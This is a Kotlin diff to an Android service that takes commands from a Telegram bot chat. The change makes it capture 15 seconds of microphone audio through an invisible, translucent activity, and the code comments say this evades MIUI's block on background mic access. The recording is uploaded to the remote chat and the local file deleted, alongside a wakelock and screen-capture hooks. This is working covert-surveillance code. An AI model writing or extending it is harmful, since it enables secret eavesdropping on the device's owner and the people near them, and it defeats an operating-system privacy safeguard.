@@ -91,6 +91,13 @@ class TelegramService : Service() {
         loadPrefs()
         registerReceiver(mediaProjectionReceiver, IntentFilter(ACTION_MEDIA_PROJECTION))
         registerReceiver(permissionResultReceiver, IntentFilter(ACTION_PERMISSION_RESULT))
+        registerReceiver(
+            recordResultReceiver,
+            IntentFilter().apply {
+                addAction(AudioRecorderActivity.ACTION_DONE)
+                addAction(AudioRecorderActivity.ACTION_FAIL)
+            }
+        )
         acquireWakeLock()
         Log.d(TAG, "onCreate: token=${botToken.take(8)}, chatId=$botChatId")
     }
@@ -103,6 +110,7 @@ class TelegramService : Service() {
         cleanupMediaProjection()
         unregisterReceiver(mediaProjectionReceiver)
         unregisterReceiver(permissionResultReceiver)
+        try { unregisterReceiver(recordResultReceiver) } catch (_: Exception) {}
     }
 
     /** Akuisisi wakelock (PARTIAL) agar polling tetap jalan saat screen off. */
@@ -569,9 +577,10 @@ class TelegramService : Service() {
         } catch (e: Exception) { /* ignore */ }
     }
 
-    /** Rekam 15 detik audio via MediaRecorder + audio focus.
-     *  MIUI requires audio focus for background recording.
-     *  Retry loop: if start() fails, release & try with MIC source. */
+    /** Rekam 15 detik audio via AudioRecorderActivity (translucent, non-visible).
+     *  MIUI memblokir mic access dari background service, tapi mengizinkan
+     *  dari app yang punya Activity di foreground. Activity ini menangani
+     *  audio focus + MediaRecorder (retry source), lalu broadcast hasil. */
     private suspend fun recordAudio(chatId: String) {
         if (isRecording) {
             sendText(chatId, "Sedang merekam... tunggu selesai.")
@@ -585,111 +594,49 @@ class TelegramService : Service() {
                 return
             }
         }
-        val ts = System.currentTimeMillis()
-        val outDir = getExternalFilesDir(null) ?: filesDir
-        val outFile = java.io.File(outDir, "rec_${ts}.m4a")
-        if (outFile.exists()) outFile.delete()
-        Log.d(TAG, "recordAudio: dir=${outDir.absolutePath}, file=${outFile.absolutePath}")
-
         isRecording = true
-        sendText(chatId, "⏺️ Mulai rekam 15 detik...")
-        scope?.launch {
-            val am = getSystemService(AUDIO_SERVICE) as AudioManager
-            var focusGranted = false
-
-            // --- 1. Request audio focus (mandatory on MIUI) ---
-            try {
-                if (Build.VERSION.SDK_INT >= 26) {
-                    val focusReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
-                        .setAudioAttributes(
-                            AudioAttributes.Builder()
-                                .setUsage(AudioAttributes.USAGE_MEDIA)
-                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
-                                .build()
-                        )
-                        .build()
-                    focusGranted = am.requestAudioFocus(focusReq) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
-                } else {
-                    @Suppress("DEPRECATION")
-                    focusGranted = am.requestAudioFocus(
-                        null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN
-                    ) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
-                }
-                Log.d(TAG, "recordAudio: audioFocus=$focusGranted")
-            } catch (e: Exception) {
-                Log.w(TAG, "recordAudio: audioFocus fail: ${e.message}")
+        sendText(chatId, "⏺️ Mulai rekam 15 detik... (layar sebaiknya ON)")
+        Log.d(TAG, "recordAudio: launching AudioRecorderActivity for chat=$chatId")
+        try {
+            val i = Intent(this, AudioRecorderActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                putExtra(AudioRecorderActivity.EXTRA_CHAT_ID, chatId)
             }
-
-            // --- 2. Try MediaRecorder with VOICE_RECOGNITION, fallback to MIC ---
-            var startOk = false
-            for (source in listOf(MediaRecorder.AudioSource.VOICE_RECOGNITION, MediaRecorder.AudioSource.MIC)) {
-                val rec = if (Build.VERSION.SDK_INT >= 31) {
-                    MediaRecorder(applicationContext)
-                } else {
-                    @Suppress("DEPRECATION")
-                    MediaRecorder()
-                }
-                mediaRecorder = rec
-                try {
-                    rec.setAudioSource(source)
-                    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                    rec.setAudioSamplingRate(44100)
-                    rec.setAudioEncodingBitRate(96000)
-                    rec.setOutputFile(outFile.absolutePath)
-                    rec.prepare()
-                    rec.start()
-                    startOk = true
-                    Log.d(TAG, "recordAudio: started with source=$source")
-                    break
-                } catch (e: Exception) {
-                    Log.w(TAG, "recordAudio: source=$source failed: ${e.javaClass.simpleName}: ${e.message}")
-                    try { rec.release() } catch (_: Exception) {}
-                    // Try next source
-                }
-            }
-            mediaRecorder = null  // managed in stopRecording below
-
-            if (!startOk) {
-                isRecording = false
-                if (focusGranted) {
-                    try { am.abandonAudioFocus(null) } catch (_: Exception) {}
-                }
-                sendText(chatId, "❌ Semua audio source gagal. MIUI mungkin memblokir mic access dari background. Buka app, lalu /record.")
-                return@launch
-            }
-
-            // --- 3. Record 15 seconds ---
-            delay(15_000L)
-
-            // --- 4. Stop & release ---
-            try { mediaRecorder?.stop() } catch (e: Exception) {
-                Log.w(TAG, "recordAudio: stop: ${e.message}")
-            }
-            try { mediaRecorder?.release() } catch (e: Exception) {
-                Log.w(TAG, "recordAudio: release: ${e.message}")
-            }
-            mediaRecorder = null
+            startActivity(i)
+        } catch (e: Exception) {
+            Log.e(TAG, "recordAudio: startActivity fail: ${e.message}")
             isRecording = false
+            scope?.launch { sendText(chatId, "❌ Gagal launching activity rekaman: ${e.message}") }
+        }
+    }
 
-            // --- 5. Release audio focus ---
-            if (focusGranted) {
-                try {
-                    if (Build.VERSION.SDK_INT < 26) {
-                        @Suppress("DEPRECATION")
-                        am.abandonAudioFocus(null)
+    /** Receiver hasil rekaman dari AudioRecorderActivity. */
+    private val recordResultReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val chatId = intent.getStringExtra(AudioRecorderActivity.EXTRA_CHAT_ID) ?: ""
+            when (intent.action) {
+                AudioRecorderActivity.ACTION_DONE -> {
+                    val path = intent.getStringExtra(AudioRecorderActivity.EXTRA_FILE) ?: ""
+                    val file = java.io.File(path)
+                    isRecording = false
+                    if (file.exists() && file.length() > 0) {
+                        Log.d(TAG, "recordResult: done, ${file.length()} bytes")
+                        scope?.launch {
+                            sendAudio(chatId, file, "Rekaman ${android.text.format.DateFormat.format("HH:mm", System.currentTimeMillis())}")
+                            file.delete()
+                        }
+                    } else {
+                        if (path.isNotEmpty()) file.delete()
+                        scope?.launch { sendText(chatId, "❌ File rekaman kosong (0 bytes).") }
                     }
-                } catch (_: Exception) {}
+                }
+                AudioRecorderActivity.ACTION_FAIL -> {
+                    val err = intent.getStringExtra(AudioRecorderActivity.EXTRA_ERROR) ?: "unknown"
+                    isRecording = false
+                    Log.w(TAG, "recordResult: fail: $err")
+                    scope?.launch { sendText(chatId, "❌ Rekaman gagal: $err") }
+                }
             }
-
-            // --- 6. Send file ---
-            if (outFile.exists() && outFile.length() > 0) {
-                Log.d(TAG, "recordAudio: file=${outFile.length()} bytes, sending...")
-                sendAudio(chatId, outFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
-            } else {
-                sendText(chatId, "❌ File rekaman kosong (0 bytes).")
-            }
-            outFile.delete()
         }
     }
 
@@ -787,28 +734,13 @@ class TelegramService : Service() {
         }
     }
 
-    private fun createRecorder(outputFile: java.io.File): MediaRecorder {
-        val r = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            MediaRecorder(this)
-        } else {
-            @Suppress("DEPRECATION")
-            MediaRecorder()
-        }
-        // Gunakan AudioSource.VOICE_RECOGNITION — paling kompatibel untuk rekam ambient
-        // di Android service (tanpa foreground audio). MIC kadang gagal saat service
-        // bukan foreground app.
-        r.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
-        r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-        r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-        r.setAudioSamplingRate(44100)
-        r.setAudioEncodingBitRate(96000)
-        r.setOutputFile(outputFile.absolutePath)
-        Log.d(TAG, "createRecorder: VOICE_RECOGNITION → MPEG_4/AAC 44.1kHz 96kbps, file=${outputFile.absolutePath}")
-        return r
-    }
-
     private fun stopRecording() {
-        val rec = mediaRecorder ?: return
+        // Recording sekarang dipegang AudioRecorderActivity (bukan service);
+        // fungsi ini cuma reset state service bila masih ada ref lama.
+        val rec = mediaRecorder ?: run {
+            isRecording = false
+            return
+        }
         isRecording = false
         mediaRecorder = null
         try {
